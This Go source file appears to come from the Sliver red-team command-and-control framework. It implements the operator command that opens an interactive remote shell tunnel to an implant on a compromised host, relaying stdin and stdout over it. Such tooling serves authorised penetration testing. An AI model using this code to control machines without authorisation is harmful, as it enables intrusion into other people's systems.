package command

import (
	"fmt"
	"io"
	"log"
	"os"
	"sliver/client/core"
	clientpb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"
	gen "sliver/server/generate"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func shell(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	noPty := ctx.Flags.Bool("no-pty")
	if ActiveSliver.Sliver.OS == gen.WINDOWS {
		noPty = true // Windows of course doesn't have PTYs
	}

	fmt.Printf(Info + "Opening shell tunnel with sliver ...\n")

	tunReq := &clientpb.TunnelCreateReq{
		SliverID: ActiveSliver.Sliver.ID,
	}
	tunReqData, _ := proto.Marshal(tunReq)
	tunResp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgTunnelCreate,
		Data: tunReqData,
	}, defaultTimeout)
	if tunResp.Error != "" {
		fmt.Printf(Warn+"Error: %s", tunResp.Error)
		return
	}
	tunnelCreate := &clientpb.TunnelCreate{}
	proto.Unmarshal(tunResp.Data, tunnelCreate)

	shellReq := &sliverpb.ShellReq{
		SliverID:  ActiveSliver.Sliver.ID,
		EnablePTY: !noPty,
		TunnelID:  tunnelCreate.TunnelID,
	}
	shellReqData, _ := proto.Marshal(shellReq)
	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgShellReq,
		Data: shellReqData,
	}, defaultTimeout)
	if resp.Error != "" {
		fmt.Printf(Warn+"Error: %s", resp.Error)
		return
	}
	openedShell := &sliverpb.Shell{}
	proto.Unmarshal(resp.Data, openedShell)

	tunnel := core.Tunnels.Tunnel(tunnelCreate.TunnelID) // Client core tunnel

	go func() {
		for recvData := range tunnel.Recv {
			tunData := &sliverpb.TunnelData{}
			proto.Unmarshal(recvData, tunData)
			log.Printf("[write] stdout shell with tunnel id = %l", tunData.TunnelID)
			os.Stdout.Write(tunData.Data)
		}
	}()

	readBuf := make([]byte, 128)
	for {
		n, err := os.Stdin.Read(readBuf)
		if err == io.EOF {
			return
		}
		data, _ := proto.Marshal(&sliverpb.TunnelData{
			Data: readBuf[:n],
		})
		log.Printf("[read] stdin tunnel %d", openedShell.TunnelID)
		go rpc(tunnel.Send(data), defaultTimeout)
	}
}
